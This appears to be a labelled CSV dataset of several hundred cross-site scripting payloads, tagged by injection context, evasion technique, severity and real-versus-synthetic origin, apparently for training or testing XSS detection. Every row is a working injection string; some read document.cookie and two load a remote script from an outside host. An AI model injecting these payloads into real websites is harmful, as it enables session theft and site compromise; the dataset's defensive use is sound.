payload,context,technique,severity,length,source
"<shadow draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</shadow>",event_handler,none,medium,89,real
""" onfocus=prompt(location.hash) """,attribute_escape,synthetic,medium,33,synthetic
<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>,event_handler,none,medium,71,real
"&lt;BR SIZE=\""&{alert('XSS')}\""&gt;",generic,none,medium,35,real
"<code oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",event_handler,none,medium,72,real
"<optgroup ondblclick=""alert(1)"">AnonKryptiQuz</optgroup>",event_handler,none,medium,56,real
<svg onclick=\u0061lert(document.domain)>,tag_injection,synthetic,medium,41,synthetic
<svg><xss onload=alert(1)></xss>,event_handler,none,medium,32,real
<svG oNfoCus=alErt('XSS')/>,tag_injection,synthetic,medium,27,synthetic
"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationend=""alert(1)""></rtc>",event_handler,none,medium,91,real
%3Cobject%20data%3D%60javascript%3Aalert%28%60AnonKryptiQuz%60%29%60%3E%3C%2Fobject%3E,generic,url_encoding,low,86,real
"<datalist onmouseup=""alert(1)"">AnonKryptiQuz</datalist>",event_handler,none,medium,55,real
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationstart=""alert(1)""></input>",event_handler,none,medium,97,real
<svg ontoggl&#101;=consol&#101;.log(1)>,tag_injection,synthetic,medium,39,synthetic
""" oNfoCus=prOmpT(dOcuMenT.dOmaIn) """,attribute_escape,synthetic,medium,35,synthetic
"%22><svg onbegin=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,55,synthetic
"<source onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</source>",event_handler,none,medium,71,real
<svg onclick=confirm(location.hash)>,tag_injection,synthetic,medium,36,synthetic
"""><svg onmous&#101;ov&#101;r=consol&#101;.log(1)>",tag_injection,synthetic,medium,49,synthetic
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",event_handler,none,medium,87,real
"<image onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</image>",event_handler,none,medium,85,real
' oNclIck=prOmpT(lOcaTioN.hAsh) ',attribute_escape,synthetic,medium,33,synthetic
"""><Svg onMouSeoVer=alErt(doCumEnt.coOkiE)>",tag_injection,synthetic,medium,42,synthetic
"<basefont onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</basefont>",event_handler,none,medium,69,real
"<tbody onmouseup=""alert(1)"">AnonKryptiQuz</tbody>",event_handler,none,medium,49,real
"<rb onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rb>",event_handler,none,medium,79,real
"<img onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</img>",event_handler,none,medium,67,real
<svg onfocus=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,57,synthetic
<center onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</center>,event_handler,none,medium,78,real
"<select onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</select>",event_handler,none,medium,73,real
javascr	ipt:void(alert(1)),js_uri,synthetic,medium,26,synthetic
alert&#40;1&#41,generic,html_entity,low,15,real
"<style>@keyframes slidein {}</style><var style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></var>",event_handler,none,medium,160,real
"""`'><script>\xEF\xBF\xBEjavascript:alert(5381)</script>",script_injection,none,medium,55,real
<svg onload=console.log(1)/>,tag_injection,synthetic,medium,28,synthetic
"<image draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</image>",event_handler,none,medium,66,real
<button popovertarget=x>Click me</button><canvas onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</canvas>,event_handler,none,medium,108,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><section id=x style=""position:absolute;"" onanimationcancel=""print()""></section>",event_handler,none,low,183,real
"?pg=javascript:alert(1)"",",js_uri,none,medium,25,real
<script>/x/alert(1)</script>,script_injection,synthetic,medium,28,synthetic
"""><svg/onload=alert(/AnonKryptiQuz/)",event_handler,none,medium,36,real
%22><svg onbegin=console.log(document.cookie)>,tag_injection,synthetic,medium,46,synthetic
"<style>@keyframes slidein {}</style><listing style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></listing>",event_handler,none,medium,168,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></canvas>",event_handler,none,medium,182,real
"<IMG SRC=\""jav&#x09;ascript:alert('XSS');\"">",tag_injection,html_entity|whitespace_obfuscation|case_variation,medium,44,real
"<time onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</time>",event_handler,none,medium,70,real
"<summary draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",event_handler,none,medium,90,real
"""><img src=data:, onerror=prompt(document.domain);>",event_handler,none,medium,51,real
"%22 onbegin=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,53,synthetic
<script>//alert(%27XSS%27)</script>,script_injection,synthetic,medium,35,synthetic
}alert(/INJECTX/);{//,generic,none,medium,21,real
""" oNtoGglE=pRomPt(LocAtiOn.HasH) """,attribute_escape,synthetic,medium,34,synthetic
"<a href=""#"" onclick=""makePopups()"">Spam</a>//[""'`-->]]>]</div>",event_handler,none,low,62,real
<plaintext onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</plaintext><input value=clickme>,event_handler,none,medium,118,real
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(8716))"">",js_uri,comment_injection|case_variation,medium,59,real
%22 onerror=alert(1) %22,attribute_escape,synthetic,medium,24,synthetic
"<svg onmous&#101;&#101;nt&#101;r=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,81,synthetic
"<image onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</image>",event_handler,none,medium,72,real
"""`'><script>\xE3\x80\x80javascript:alert(4334)</script>",script_injection,none,medium,55,real
<track onpointerout=alert(1) style=display:block>AnonKryptiQuz</track>,event_handler,none,medium,70,real
"<small draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</small>",event_handler,none,medium,68,real
<svg/onload=%26nbsp;alert`bohdan`+,event_handler,url_encoding,low,34,real
<svg onload=confirm('XSS')/>,tag_injection,synthetic,medium,28,synthetic
"<isindex onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</isindex>",event_handler,none,medium,73,real
"""%3E%3Cimg onload=alert(1)%3E",tag_injection,synthetic,medium,29,synthetic
<animatemotion contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,67,real
"EvaL(""ConSolE.lOg(1)"")",dom_sink,synthetic,medium,22,synthetic
"""><iframe srcdoc='%26lt;script>;prompt${document.domain}%26lt;/script>'>",tag_injection,url_encoding,low,72,real
<x oncut=alert(1)>copy this!,event_handler,none,medium,28,real
<multicol id=x tabindex=1 onbeforeactivate=alert(1)></multicol>,event_handler,none,medium,63,real
'onload=alert(1)><svg/1=',event_handler,none,medium,25,real
"<style>:target {transform: rotate(180deg);}</style><shadow id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></shadow>",event_handler,none,medium,130,real
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></abbr>",event_handler,none,medium,111,real
"<legend ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</legend>",event_handler,none,medium,93,real
<source onpointerdown=alert(1) style=display:block>AnonKryptiQuz</source>,event_handler,none,medium,73,real
<button popovertarget=x>Click me</button><figcaption onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</figcaption>,event_handler,none,medium,116,real
%27 onload=console.log(document.cookie) %27,attribute_escape,synthetic,medium,43,synthetic
"<table draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</table>",event_handler,none,medium,68,real
"<A href=""javascript%26colon;confirm()"">click",attribute_escape,url_encoding|case_variation,medium,44,real
<scRipT>//coNfiRm(1)</scRipT>,script_injection,synthetic,medium,29,synthetic
""" onfocus=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,58,synthetic
%3Cscript%3Ealert%28%22AnonKryptiQuz%22%29%3B%3C%2fscript%3E,generic,url_encoding,low,60,real
"<details onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</details>",event_handler,none,medium,67,real
<svg onfocus=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,54,synthetic
<li onpointerover=alert(1) style=display:block>AnonKryptiQuz</li>,event_handler,none,medium,65,real
<svG oNbeGin=coNsoLe.Log(doCumEnt.coOkiE)/>,tag_injection,synthetic,medium,43,synthetic
%27 onfocus=confirm(document.cookie) %27,attribute_escape,synthetic,medium,40,synthetic
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=print()></noframes>",event_handler,none,low,118,real
' oNmoUseEntEr=ConFirM(dOcuMenT.dOmaIn) ',attribute_escape,synthetic,medium,41,synthetic
<svg/%6f%6e/oNloaD=alert``>,event_handler,url_encoding,low,27,real
"!--"" /><script>alert('xss');</script>",script_injection,none,medium,37,real
<button popovertarget=x>Click me</button><fieldset ontoggle=alert(1) popover id=x>AnonKryptiQuz</fieldset>,event_handler,none,medium,106,real
<main onpointermove=alert(1) style=display:block>AnonKryptiQuz</main>,event_handler,none,medium,69,real
<textarea onselect=alert(1) autofocus>AnonKryptiQuz</textarea>,event_handler,none,medium,62,real
"<rp onmouseup=""alert(1)"">AnonKryptiQuz</rp>",event_handler,none,medium,43,real
<embed onfocusout=alert(1) tabindex=1 id=x></embed><input autofocus>,event_handler,none,medium,68,real
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=aLerT(dOcuMenT.cOokIe)>"")",dom_sink,synthetic,medium,60,synthetic
<menuitem onblur=alert(1) tabindex=1 id=x></menuitem><input autofocus>,event_handler,none,medium,70,real
"<style>:target {color:red;}</style><rp id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></rp>",event_handler,none,medium,108,real
"""><svg onfocus=confirm(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,50,synthetic
"<style>:target {color: red;}</style><datalist id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></datalist>",event_handler,none,medium,119,real
"<style>@keyframes slidein {}</style><sup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></sup>",event_handler,none,medium,160,real
"%22 onmouseover=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,62,synthetic
"<svG oNbeGin=prOmpT(STriNg.FroMChArCOde(88,83,83))/>",tag_injection,synthetic,medium,52,synthetic
"<img src=""x` `<script>javascript:alert(6082)</script>""` `>",script_injection,none,medium,58,real
<dl contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,56,real
&#60;script&#62;alert(1)&#60;/script&#62;,generic,html_entity,medium,41,real
<svg onlo&#97;d=confirm(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,52,synthetic
"<style>:target {color:red;}</style><th id=x style=""transition:color 1s"" ontransitionstart=alert(1)></th>",event_handler,none,medium,104,real
"""><svg on&#101;rror=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,58,synthetic
%3Csvg onfocus=confirm(1)/%3E,tag_injection,synthetic,medium,29,synthetic
' ontoggle=prompt('XSS') ',attribute_escape,synthetic,medium,26,synthetic
"<blockquote onmouseenter=""alert(1)"">AnonKryptiQuz</blockquote>",event_handler,none,medium,62,real
"<input3 draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</input3>",event_handler,none,medium,85,real
%22><svg onload=alert(document.cookie)>,tag_injection,synthetic,medium,39,synthetic
"<div draggable=""true"" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable style=display:block>drop here</nav>",event_handler,none,medium,123,real
"<ins oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
' oNloAd=ConSolE.lOg(1) ',attribute_escape,synthetic,medium,25,synthetic
"<header draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</header>",event_handler,none,medium,70,real
"document.write(""<img src=x onerror=prompt(location.hash)>"")",dom_sink,synthetic,medium,59,synthetic
"<address onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</address>",event_handler,none,medium,76,real
&#x03C,generic,html_entity,low,6,real
"<track draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</track>",event_handler,none,medium,88,real
<BODY ONLOAD=javascript:alert(1)>,event_handler,case_variation,medium,33,real
<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>,event_handler,none,medium,76,real
<noscript onpointerdown=alert(1) style=display:block>AnonKryptiQuz</noscript>,event_handler,none,medium,77,real
<form onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</form><input value=clickme>,event_handler,none,medium,108,real
"<img src=x onerror=alert(String.fromCharCode(88,83,83));>",event_handler,encoding,medium,57,real
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",script_injection,case_variation,low,59,real
"&lt;A HREF=\""http&#58;//1113982867/\""&gt;XSS&lt;/A&gt;",generic,html_entity,low,54,real
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onwebkitanimationend=""alert(1)""></tfoot>",event_handler,none,medium,101,real
"'&#x3E;'>""><script>alert(2);</script>",script_injection,html_entity,medium,37,real
"<div draggable=""true"" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>",event_handler,none,medium,103,real
"&#101;v&#97;l(""&#97;l&#101;rt('XSS')"")",dom_sink,synthetic,medium,38,synthetic
%3Cscript%3Ealert(document.cookie)%3C/script%3E,script_injection,synthetic,medium,47,synthetic
<input4 onpointerleave=alert(1) style=display:block>AnonKryptiQuz</input4>,event_handler,none,medium,74,real
"<area oncut=""alert(1)"" contenteditable>AnonKryptiQuz</area>",event_handler,none,medium,59,real
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationend=""alert(1)""></frame>",event_handler,none,medium,95,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=""position:absolute;"" onanimationcancel=""print()""></details>",event_handler,none,low,183,real
"<link onmouseover=""alert(1)"">AnonKryptiQuz</link>",event_handler,none,medium,49,real
=<img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert%26%23x28;1%26%23x29;>,tag_injection,url_encoding,low,151,real
"<hgroup onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</hgroup>",event_handler,none,medium,65,real
"<img src=""javascript:alert(2)"">",js_uri,none,medium,31,real
""" onfocus=\u0061lert(String.fromCharCode(88,83,83)) autofocus=""",attribute_escape,synthetic,medium,63,synthetic
"<style>@keyframes x{}</style><font style=""animation-name:x"" onanimationstart=""alert(1)""></font>",event_handler,none,medium,95,real
<a2 onpointerenter=alert(1) style=display:block>AnonKryptiQuz</a2>,event_handler,none,medium,66,real
<svg ontoggl&#101;=prompt('XSS')>,tag_injection,synthetic,medium,33,synthetic
"<style>:target {transform: rotate(180deg);}</style><picture id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></picture>",event_handler,none,medium,132,real
"<IMG SRC=x onplaying=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,60,real
"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable style=display:block>drop here</rtc>",event_handler,none,medium,127,real
"<bgsound onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</bgsound>",event_handler,none,medium,73,real
blalala');alert(1);('a,generic,none,medium,22,real
"<kbd onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</kbd>",event_handler,none,medium,81,real
"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",event_handler,none,medium,105,real
"%22 onerror=alert(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,52,synthetic
"<menuitem onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</menuitem>",event_handler,none,medium,78,real
<samp onpointermove=alert(1) style=display:block>AnonKryptiQuz</samp>,event_handler,none,medium,69,real
""" oNbeGin=alErt(loCatIon.haSh) """,attribute_escape,synthetic,medium,32,synthetic
"<img src\x12=x onerror=""javascript:alert(1)"">",event_handler,none,medium,45,real
"<td ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</td>",event_handler,none,medium,85,real
<noembed onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</noembed>,event_handler,none,medium,80,real
' oNmoUseEntEr=AleRt(1) ',attribute_escape,synthetic,medium,25,synthetic
' oNloAd=ConFirM('XSS') ',attribute_escape,synthetic,medium,25,synthetic
<svg onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,61,synthetic
"<param onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</param>",event_handler,none,medium,71,real
"#1&""><script>alert(1)</script>=1",script_injection,none,medium,32,real
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//,event_handler,none,low,61,real
%22 onbegin=console.log(%27XSS%27) %22,attribute_escape,synthetic,medium,38,synthetic
"<acronym onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</acronym>",event_handler,none,medium,70,real
"<scr	ipt>confirm`String.fromCharCode(88,83,83)`</scr	ipt>",script_injection,synthetic,medium,57,synthetic
"<i onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</i>",event_handler,none,medium,61,real
"<style>:target {color:red;}</style><data id=x style=""transition:color 1s"" ontransitionend=alert(1)></data>",event_handler,none,medium,106,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><h1 id=x style=""position:absolute;"" onanimationcancel=""print()""></h1>",event_handler,none,low,173,real
"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,none,medium,103,real
"<var oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</var>",event_handler,none,medium,58,real
"<section oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
<content onpointerover=alert(1) style=display:block>AnonKryptiQuz</content>,event_handler,none,medium,75,real
<button popovertarget=x>Click me</button><table ontoggle=alert(1) popover id=x>AnonKryptiQuz</table>,event_handler,none,medium,100,real
q=javascript:alert(document.domain),js_uri,none,medium,35,real
%22 onbegin=confirm(location.hash) %22,attribute_escape,synthetic,medium,38,synthetic
"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(3140)"">DEF",js_uri,none,medium,67,real
&lt;script&gt;alert(1)&lt;/script&gt;,generic,none,medium,37,real
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",event_handler,none,medium,115,real
"""><Svg onMouSeoVer=alErt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
"<progress onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",event_handler,none,medium,77,real
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,event_handler,html_entity|whitespace_obfuscation,low,59,real
"<source onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</source>",event_handler,none,medium,71,real
%22 onfocus=console.log(%27XSS%27) autofocus=%22,attribute_escape,synthetic,medium,48,synthetic
' onclick=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,49,synthetic
"' onmouseover=confirm(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,54,synthetic
"<image draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</image>",event_handler,none,medium,68,real
<input id=x tabindex=1 onbeforeactivate=alert(1)></input>,event_handler,none,medium,57,real
"' onfocus=prompt(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,49,synthetic
"<shadow oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
""" oNmoUseEntEr=ProMpt(doCumEnt.coOkiE) """,attribute_escape,synthetic,medium,40,synthetic
"<ol onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</ol>",event_handler,none,medium,66,real
"<scr	ipt>/x/console.log(String.fromCharCode(88,83,83))</scr	ipt>",script_injection,synthetic,medium,64,synthetic
"<h1 oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</h1>",event_handler,none,medium,56,real
<wbr onfocus=alert(1) autofocus tabindex=1>,event_handler,none,medium,43,real
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,event_handler,none,medium,60,real
%3Csvg onclick=confirm(location.hash)%3E,tag_injection,synthetic,medium,40,synthetic
""" onfocus=consol&#101;.log(1) """,attribute_escape,synthetic,medium,31,synthetic
"<bdo onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</bdo>",event_handler,none,medium,67,real
"<noembed onmousedown=""alert(1)"">AnonKryptiQuz</noembed>",event_handler,none,medium,55,real
"<shadow onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",event_handler,none,medium,67,real
""" onfocus=alert(location.hash) autofocus=""",attribute_escape,synthetic,medium,42,synthetic
"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,none,medium,96,real
"<video draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</video>",event_handler,none,medium,86,real
"%E5%98%8D%E5%98%8A%20""><img src=x onerror=prompt(document.domain);>",event_handler,url_encoding,medium,67,real
<svG oNloAd=AleRt(1)/>,tag_injection,synthetic,medium,22,synthetic
"?javascript:alert(1)"",",js_uri,none,medium,22,real
j&#97;vascript:console.log(location.hash),js_uri,synthetic,medium,41,synthetic
<svg onmous&#101;&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,67,synthetic
"<meta oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</meta>",event_handler,none,medium,60,real
<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>,event_handler,none,medium,56,real
"<a href=""javascript\x0A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
' oNerRor=prOmpT(dOcuMenT.cOokIe) ',attribute_escape,synthetic,medium,35,synthetic
<output id=x tabindex=1 onfocus=alert(1)></output>,event_handler,none,medium,50,real
"<IMG SRC=x onmouseover=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,62,real
"<svg onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</svg>",event_handler,none,medium,59,real
"<h1 draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</h1>",event_handler,none,medium,57,real
<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>,event_handler,none,medium,66,real
"<section onclick=""alert(1)"">AnonKryptiQuz</section>",event_handler,none,medium,51,real
""" ontoggl&#101;=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,50,synthetic
"<blink onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</blink>",event_handler,none,medium,70,real
"<cite onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</cite>",event_handler,none,medium,66,real
"<img src=""blah""onmouseover=""document.vulnerable=true;"">",event_handler,none,low,55,real
"<style>:target {color:red;}</style><dialog id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></dialog>",event_handler,none,medium,116,real
"<div draggable=""true"" contenteditable>drag me</div><data ondrop=alert(1) contenteditable style=display:block>drop here</data>",event_handler,none,medium,125,real
"<bdo onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</bdo>",event_handler,none,medium,65,real
%3Csvg onmouseover=confirm(document.cookie)/%3E,tag_injection,synthetic,medium,47,synthetic
"<dt onclick=""alert(1)"">AnonKryptiQuz</dt>",event_handler,none,medium,41,real
<link onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</link>,event_handler,none,medium,74,real
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationend=""alert(1)""></body>",event_handler,none,medium,93,real
"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",event_handler,none,medium,84,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(docum&#101;nt.dom&#97;in)>"")",dom_sink,synthetic,medium,85,synthetic
"<img\x32src=x onerror=""javascript:alert(1)"">",event_handler,none,medium,44,real
"<title draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</title>",event_handler,none,medium,88,real
<button popovertarget=x>Click me</button><audio ontoggle=alert(1) popover id=x>AnonKryptiQuz</audio>,event_handler,none,medium,100,real
"%22 onerror=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,58,synthetic
"{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(""x='""+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+""'"");}}",template_injection,unicode_escape|encoding,high,143,real
"<tfoot onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</tfoot>",event_handler,none,medium,67,real
"<u onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</u>",event_handler,none,medium,63,real
' oNbeGin=alErt(1) ',attribute_escape,synthetic,medium,20,synthetic
"<area onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</area>",event_handler,none,medium,64,real
"<datalist draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</datalist>",event_handler,none,medium,94,real
"<track onclick=""alert(1)"">AnonKryptiQuz</track>",event_handler,none,medium,47,real
<button popovertarget=x>Click me</button><area onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</area>,event_handler,none,medium,104,real
<svg><spacer onload=alert(1)></spacer>,event_handler,none,medium,38,real
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",script_injection,case_variation,low,56,real
"""><Svg onLoaD=pRomPt(1)>",tag_injection,synthetic,medium,24,synthetic
"<div draggable=""true"" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>",event_handler,none,medium,111,real
<marquee/onstart=c=String.fromCharCode;confirm(c(47)+c(88)+c(83)+c(83)+c(47))>,event_handler,encoding,medium,78,real
&#x000003C,generic,html_entity,low,10,real
<multicol onpointermove=alert(1) style=display:block>AnonKryptiQuz</multicol>,event_handler,none,medium,77,real
"<x xmlns=""http://www.w3.org/2001/xml-events"" event=""load"" observer=""foo"" handler=""data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar""/>",attribute_escape,url_encoding,medium,295,real
"<svG oNmoUseOveR=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
